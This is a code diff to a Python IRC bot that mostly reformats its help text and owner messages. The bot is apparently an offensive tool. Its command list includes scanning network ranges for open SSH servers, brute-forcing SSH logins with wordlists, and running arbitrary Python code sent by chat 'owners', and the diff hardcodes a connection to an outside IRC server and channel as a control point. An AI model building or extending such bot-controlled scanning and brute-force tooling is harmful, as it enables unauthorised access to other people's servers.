@@ -21,21 +21,21 @@ class Bot:
 	LOL = False
 
 	USAGE = {
-		'power': 'power [nickname] # gives power to {nickname} (admin-only).',
-		'gods': 'gods # show who i serve.',
-		'nick': 'nick [nickname] # change nickname (admin-only).',
-		'join': 'join [channel] # join channel (admin-only).',
-		'jobs': 'jobs # show all runnning jobs.',
-		'stop': 'stop [jobname|all] # stop all jobs or jobs with {jobname} (admin-only).',
-		'silent': 'silent [1|0] # silent execution, 1 equals true, 0 equals false (admin-only).',
-		'py': 'py [python_code] # compile a slice of python code and returns it.',
-		'dns': 'dns [dns] # show {dns} host.',
-		'ip': 'ip [ip] # show {ip} geolocation.',
-		'proxy': 'proxy [URL] # check for all proxies in URL (text file with proxies).',
-		'ssh': 'ssh [net] # scan for open sshs in net (e.g. 200.100.100).',
-		'nssh': 'nssh # show the number of open sshs currently stored.',
-		'bsshu': 'bsshu [ssh] [key] # brute force {ssh} with given {key}.',
-		'bssh': 'bssh [URL] [keys_per_thread] # brute force stored open sshs with {URL} wordlist and {keys_per_thread}.',
+		'power': {'syntax': 'power [nickname]', 'expl': 'gives power to {nickname} (admin-only).'},
+		'gods': {'syntax': 'gods', 'expl': 'show who i serve.'},
+		'nick': {'syntax': 'nick [nickname]', 'expl': 'change nickname (admin-only).'},
+		'join': {'syntax': 'join [channel]', 'expl': 'join channel (admin-only).'},
+		'jobs': {'syntax': 'jobs', 'expl': 'show all runnning jobs.'},
+		'stop': {'syntax': 'stop [jobname|all]', 'expl': 'stop all jobs or jobs with {jobname} (admin-only).'},
+		'silent': {'syntax': 'silent [1|0]', 'expl': 'silent execution, 1 equals true, 0 equals false (admin-only).'},
+		'py': {'syntax': 'py [python_code]', 'expl': 'compile a slice of python code and returns it.'},
+		'dns': {'syntax': 'dns [dns]', 'expl': 'show {dns} host.'},
+		'ip': {'syntax': 'ip [ip]', 'expl': 'show {ip} geolocation.'},
+		'proxy': {'syntax': 'proxy [URL]', 'expl': 'check for all proxies in URL (text file with proxies).'},
+		'ssh': {'syntax': 'ssh [net]', 'expl': 'scan for open sshs in net (e.g. 200.100.100).'},
+		'nssh': {'syntax': 'nssh', 'expl': 'show the number of open sshs currently stored.'},
+		'bsshu': {'syntax': 'bsshu [ssh] [key]', 'expl': 'brute force {ssh} with given {key}.'},
+		'bssh': {'syntax': 'bssh [URL] [keys_per_thread]', 'expl': 'brute force stored open sshs with {URL} wordlist and {keys_per_thread}.'},
 		#'summoner': 'summoner [summoner_name] # show {summoner_name} data.',
 		#'rank': 'rank [summoner_name] # show {summoner_name} rank data.',
 		#'last': 'last [summoner_name] # show {summoner_name} last game data.',
@@ -134,14 +134,14 @@ class Bot:
 
 	def check_args(self, args, req, place):
 		if len(args) < req:
-			self.printayne('?', [place])
+			self.printayne_e('?', [place])
 			return False
 		return True
 
 	def check_owner(self, source, place):
 		if source in self.OWNERS:
 			return True
-		self.printayne('who the fuck are you?', [place])
+		self.printayne_e('who the fuck are you?', [place])
 		return False
 
 	def add_jobs(self, key, jobs):
@@ -183,7 +183,8 @@ class Bot:
 		if (cmd == 'help'):
 			if args:
 				if args[0] in self.USAGE:
-					self.printayne('{0} {1}'.format(self.PREFIX, self.USAGE[args[0]]), [place])
+					usage = self.USAGE[args[0]]
+					self.printayne('{0}{1} {2}=>{3} {4} {5}# {6}'.format(color_yval, args[0], color_arg, color_val, usage['syntax'], color_arg, usage['expl']), [place])
 					return
 			self.printayne(self.HELP, [place])
 
@@ -192,12 +193,14 @@ class Bot:
 				return
 			if not self.check_args(args, 1, place):
 				return
-
+			if args[0] in self.OWNERS:
+				self.printayne('{0}{1}{2} is already a {3}god'.format(color_yval, args[0], color_arg, color_val), [place])
+				return
 			self.OWNERS.append(args[0])
-			self.printayne('now {0} has full power'.format(args[0]), place)
+			self.printayne('{0}now{1} {2} {3}has {4}full power'.format(color_arg, color_yval, args[0], color_arg, color_val), [place])
 
 		if (cmd == 'gods'):
-			self.printayne('i serve to => [{0}]'.format(', '.join(self.OWNERS)), [place])
+			self.printayne('{0}i serve to =>{1} {2}'.format(color_arg, color_val, ', '.join(self.OWNERS)), [place])
 
 		if (cmd == 'nick'):
 			if not self.check_owner(source, place):
@@ -512,9 +515,9 @@ class Bot:
 					self.parse(clean)
 
 if __name__ == '__main__':
-	bot = Bot(sys.argv[2])
+	bot = Bot('TEST')
 	#bot.add_connection('google.root-network.org', 6667)
-	bot.add_connection(sys.argv[1], 6667)
+	bot.add_connection('fifacbpc.com', 6667)
 	channels = ['#{0}'.format(x) for x in sys.argv[3:]]
-	bot.set_channels(channels)
+	bot.set_channels(['#segfault'])
 	bot.connect()
